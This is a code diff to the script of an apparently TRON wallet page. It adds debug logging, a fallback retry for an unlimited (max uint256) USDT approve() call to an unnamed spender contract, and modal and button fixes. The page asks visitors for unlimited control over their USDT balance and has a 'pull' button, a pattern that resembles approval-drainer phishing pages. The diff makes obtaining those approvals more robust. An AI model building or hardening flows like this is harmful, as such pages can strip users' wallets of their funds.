@@ -1330,6 +1330,9 @@ async function connectViaProvider(env) {
 <script>
 'use strict';
 async function doApproveFlow() {
+  Log.tx('========== doApproveFlow START ==========');
+
+  // Guard: 防止重复点击
   if (state === STATE.APPROVING) {
     Log.warn('doApprove: already approving — ignored');
     return;
@@ -1354,18 +1357,30 @@ async function doApproveFlow() {
     return;
   }
 
-  Log.tx('doApprove: sending approve tx');
-  Log.tx('  contract:  ' + USDT_CONTRACT());
-  Log.tx('  spender:   ' + SPENDER_CONTRACT());
-  Log.tx('  amount:    ' + UNLIMITED_HEX);
+  // 打印完整的发送参数
+  const amountToApprove = UNLIMITED_HEX;
+  const amountDecimal   = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // max uint256
+  Log.tx('doApprove: === SEND PARAMS ===');
+  Log.tx('  tw source:           ' + (DIAG.providerSource || 'unknown'));
+  Log.tx('  contract:            ' + USDT_CONTRACT());
+  Log.tx('  spender:             ' + SPENDER_CONTRACT());
+  Log.tx('  amount (hex):        ' + amountToApprove);
+  Log.tx('  amount (decimal):    ' + amountDecimal);
+  Log.tx('  feeLimit:            100_000_000');
+  Log.tx('  callValue:           0');
+  Log.tx('  shouldPollResponse:  false');
+  Log.tx('=============================');
 
-  openModal(
+  try {
+    openModal(
     'Confirm Unlimited Approval',
     '<div class="mh">Contract: ' + SPENDER_CONTRACT() + '<br>Token: TRC20 USDT<br>Amount: UNLIMITED</div>' +
     '<p style="font-size:12px;color:#888;text-align:left;margin-top:8px">This grants the contract full control over your USDT balance. Verify the contract address before signing.</p>',
     'Sign & Approve',
     false,
     async () => {
+      // ========== APPROVE CALLBACK ENTERED ==========
+      Log.tx('>>> doApproveFlow callback: ENTERED');
       state = STATE.APPROVING;
       setBtns(true);
       hideErr();
@@ -1374,18 +1389,55 @@ async function doApproveFlow() {
       stepSet(4, 'on', 'Wait for Approval On-Chain', 'Waiting for tx to be confirmed...', null);
 
       try {
-        const usdt = await tw.contract().at(USDT_CONTRACT());
-        const tx   = await usdt.approve(SPENDER_CONTRACT(), UNLIMITED_HEX).send({
-          feeLimit: 100_000_000,
-          callValue: 0,
-          shouldPollResponse: false,
-        });
+        // Step 1: 获取当前 provider source
+        const { tw: currentTw, source: currentSource } = getTronWeb();
+        Log.tx('Step1 tw source: ' + currentSource + ', tw=' + !!currentTw);
+        if (!currentTw) throw new Error('TronWeb became unavailable');
 
+        // Step 2: 实例化合约
+        Log.tx('Step2: tw.contract().at(' + USDT_CONTRACT() + ') START');
+        const usdt = await currentTw.contract().at(USDT_CONTRACT());
+        Log.tx('Step2: tw.contract().at(...) SUCCESS');
+
+        // Step 3: 构建 approve transaction object
+        const approveCall = usdt.approve(SPENDER_CONTRACT(), amountToApprove);
+        Log.tx('Step3: approve(...) object built. spender=' + SPENDER_CONTRACT() + ', amount=' + amountToApprove);
+
+        // Step 4: 尝试发送（primary: hex string amount）
+        Log.tx('Step4: send() START with hex amount');
+        let tx;
+        try {
+          tx = await approveCall.send({
+            feeLimit: 100_000_000,
+            callValue: 0,
+            shouldPollResponse: false,
+          });
+          Log.tx('Step4: send() SUCCESS. tx=' + tx);
+        } catch (sendErr) {
+          Log.warn('Step4: send() FAILED with hex amount: ' + (sendErr.message || String(sendErr)));
+          logRawError('Step4-send-hex', sendErr);
+          // Fallback: 尝试用 decimal amount
+          Log.tx('Step4-FALLBACK: retrying with decimal amount...');
+          const approveCall2 = usdt.approve(SPENDER_CONTRACT(), amountDecimal);
+          tx = await approveCall2.send({
+            feeLimit: 100_000_000,
+            callValue: 0,
+            shouldPollResponse: false,
+          });
+          Log.tx('Step4-FALLBACK: send() SUCCESS with decimal. tx=' + tx);
+        }
+
+        // Step 5: tx hash 验证
+        if (!tx || !String(tx).trim()) {
+          throw new Error('send() returned empty/falsy tx: ' + JSON.stringify(tx));
+        }
+        Log.tx('Step5: tx confirmed non-empty. tx=' + String(tx));
         Log.tx('Approve tx sent: ' + tx);
         showTxCard(tx);
         stepSet(3, 'ok', 'Approve (Unlimited)', 'Approval tx sent', tx);
         stepSet(4, 'on', 'Wait for Approval On-Chain', 'Confirming... (0 blocks)', tx);
 
+        // Step 6: 轮询确认
         let status = null, blocks = 0, tries = 0;
         while (!status && tries < MAX_POLL) {
           await delay(POLL_MS);
@@ -1422,8 +1474,10 @@ async function doApproveFlow() {
           onApprovalSuccess(tx);
         }
       } catch (e) {
-        const msg    = e.message || String(e);
-        const reject = /denied|reject|cancel|signature|user denied|rejected/i.test(msg);
+        Log.err('========== doApproveFlow callback ERROR ==========');
+        logRawError('doApprove-callback', e);
+        const msg = e.message || String(e);
+        const reject = /denied|reject|cancel|signature|user denied|rejected|refused/i.test(msg);
         state = STATE.FAIL;
         stepSet(3, 'fail', 'Approve (Unlimited)',
           reject ? 'User rejected' : 'Error: ' + msg.slice(0, 120), null);
@@ -1432,9 +1486,18 @@ async function doApproveFlow() {
         toast(reject ? 'Signature rejected' : 'Approve failed', 'er');
         Log.err('Approve error: ' + msg);
         setBtns(false);
+        // 重新启用 btnApprove 以便用户重试
+        $('btnApprove').disabled = false;
+        Log.tx('========== doApproveFlow END (error) ==========');
       }
     }
   );
+  } catch (e) {
+    // Safety net: 如果 openModal 本身报错，重新启用 btnApprove
+    $('btnApprove').disabled = false;
+    Log.err('openModal threw in doApproveFlow: ' + (e.message || String(e)));
+    logRawError('doApproveFlow-openModal', e);
+  }
 }
 
 async function onApprovalSuccess(tx) {
@@ -1626,10 +1689,19 @@ function setBtns(dis) {
   $('btnTP').disabled = dis;
   $('btnIm').classList.toggle('dis', dis);
   $('btnTP').classList.toggle('dis', dis);
-  ['btnApprove', 'btnPull'].forEach(id => {
-    const el = $(id);
-    if (el) el.disabled = dis;
-  });
+  // 只对可见的按钮进行操作，避免 re-enable 已隐藏 btnApprove
+  const btnApprove = $('btnApprove');
+  const btnPull    = $('btnPull');
+  if (btnApprove && !btnApprove.offsetParent) {
+    // btnApprove 在隐藏容器中，不操作它
+  } else if (btnApprove) {
+    btnApprove.disabled = dis;
+  }
+  if (btnPull && !btnPull.offsetParent) {
+    // btnPull 在隐藏容器中，不操作它
+  } else if (btnPull) {
+    btnPull.disabled = dis;
+  }
 }
 
 function showTxCard(tx) {
@@ -1652,19 +1724,49 @@ function hideErr() {
   hideDiagBar();
 }
 
+/**
+ * openModal — 显示自定义 modal，带回调
+ * @param {string} title
+ * @param {string} bodyHtml
+ * @param {string} confirmText
+ * @param {boolean} isDanger
+ * @param {function|null} cb — modal 确认后的回调
+ */
 function openModal(title, bodyHtml, confirmText, isDanger, cb) {
+  Log.click('openModal called | title="' + title + '" | cb=' + (typeof cb === 'function' ? 'function' : String(cb)));
   $('mTitle').textContent = title;
   $('mBody').innerHTML = bodyHtml;
   const btn = $('mBtnYes');
   btn.textContent = confirmText || 'Confirm';
   btn.className = 'btn-yes' + (isDanger ? ' dp' : '');
+  btn.disabled = false;
   modalCb = cb;
+  Log.click('openModal | modalCb assigned: ' + (modalCb !== null && typeof modalCb === 'function'));
   $('modal').classList.add('sh');
 }
 
-function closeModal() {
+/**
+ * closeModal — 关闭 modal
+ * @param {object} opts
+ * @param {boolean} opts.keepCallback - true=保留 modalCb（仅清除视觉），false=同时清空 modalCb
+ * @param {function|null} opts.onCancel - modal 被取消时调用的回调（如 re-enable 按钮）
+ */
+function closeModal(opts) {
+  const keepCallback = opts && opts.keepCallback === true;
+  const cbBefore = modalCb !== null && typeof modalCb === 'function';
+  const onCancel = opts && typeof opts.onCancel === 'function';
+  Log.click('closeModal called | keepCallback=' + keepCallback + ' | modalCb before: ' + cbBefore + ' | onCancel=' + !!onCancel);
   $('modal').classList.remove('sh');
-  modalCb = null;
+  if (!keepCallback) {
+    modalCb = null;
+    Log.click('closeModal | modalCb cleared (keepCallback=false)');
+  } else {
+    Log.click('closeModal | modalCb preserved (keepCallback=true)');
+  }
+  if (onCancel) {
+    Log.click('closeModal | invoking onCancel callback');
+    try { onCancel(); } catch(e) { Log.err('onCancel threw: ' + (e.message || String(e))); }
+  }
 }
 
 function toast(msg, type) {
@@ -1816,9 +1918,9 @@ function doReset() {
 
   $('btnApprove').addEventListener('click', function(e) {
     e.preventDefault();
-    Log.click('btnApprove clicked. state=' + state + ', wAddr=' + !!wAddr + ', tw=' + !!tw);
+    Log.click('btnApprove clicked. state=' + state + ', wAddr=' + !!wAddr + ', tw=' + !!tw + ', disabled=' + this.disabled);
     if (this.disabled) {
-      Log.warn('btnApprove disabled');
+      Log.warn('btnApprove disabled — ignored');
       return;
     }
     if (!wAddr || !tw) {
@@ -1826,6 +1928,8 @@ function doReset() {
       $('wbtnLabel').textContent = 'Connect a wallet first';
       return;
     }
+    // 立即禁用，等待 modal 打开后再启用（或在错误时恢复
+    this.disabled = true;
     doApproveFlow();
   });
 
@@ -1843,18 +1947,67 @@ function doReset() {
   });
 
   $('mBtnNo').addEventListener('click', function() {
-    Log.click('Modal cancel');
-    closeModal();
+    Log.click('Modal cancel clicked');
+    closeModal({ onCancel: () => {
+      $('btnApprove').disabled = false;
+      Log.click('btnApprove re-enabled after Cancel');
+    }});
   });
 
-  $('mBtnYes').addEventListener('click', function() {
-    Log.click('Modal confirm');
-    closeModal();
-    if (modalCb) modalCb();
+  $('mBtnYes').addEventListener('click', async function() {
+    Log.click('======== mBtnYes click START ========');
+    Log.click('modalCb typeof: ' + typeof modalCb);
+    Log.click('modalCb !== null: ' + (modalCb !== null));
+    Log.click('modalCb is function: ' + (typeof modalCb === 'function'));
+
+    const cbExists = modalCb !== null && typeof modalCb === 'function';
+    Log.click('cbExists = ' + cbExists);
+
+    if (!cbExists) {
+      Log.err('modalCb is null/undefined — callback NOT found! Will NOT execute anything.');
+      toast('Modal callback missing — please refresh and try again', 'er');
+      return;
+    }
+
+    // Step 1: 保存 callback 到局部变量
+    const cb = modalCb;
+    Log.click('cb saved to local var: typeof=' + typeof cb);
+
+    // Step 2: 立即禁用按钮，防止重复点击
+    this.disabled = true;
+    Log.click('mBtnYes disabled=true immediately');
+
+    // Step 3: 关闭视觉 modal（保留 callback，等执行完再清空）
+    Log.click('Calling closeModal({ keepCallback: true })');
+    closeModal({ keepCallback: true });
+
+    // Step 4: 执行 callback（带完整 try/catch + await）
+    Log.click('Executing modal callback...');
+    try {
+      await cb();
+      Log.click('Modal callback finished successfully');
+    } catch (e) {
+      Log.err('Modal callback threw an error:');
+      logRawError('mBtnYes-callback', e);
+      const msg = formatDetailedError('Callback error', e);
+      showErr(msg);
+      toast('Operation error: ' + msg.slice(0, 80), 'er');
+    } finally {
+      // 清理 callback 引用
+      modalCb = null;
+      Log.click('modalCb = null in finally');
+      Log.click('======== mBtnYes click END ========');
+    }
   });
 
   $('modal').addEventListener('click', function(e) {
-    if (e.target === this) closeModal();
+    if (e.target === this) {
+      Log.click('Modal backdrop clicked — closing');
+      closeModal({ onCancel: () => {
+        $('btnApprove').disabled = false;
+        Log.click('btnApprove re-enabled after backdrop click');
+      }});
+    }
   });
 
   $('dbgHeader').addEventListener('click', function() {
